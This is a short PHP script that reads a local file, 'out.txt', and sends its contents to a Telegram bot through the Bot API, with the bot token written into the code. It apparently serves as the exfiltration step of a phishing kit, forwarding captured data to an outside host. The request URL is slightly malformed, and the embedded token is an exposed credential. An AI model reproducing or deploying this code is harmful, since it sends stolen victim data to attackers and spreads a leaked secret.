<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot1328975529:AAHELCArgKeIH9OA-hXqMbNxjpTLiEZ2bRM/sendMessage?980954758=&text=$msg");
?>
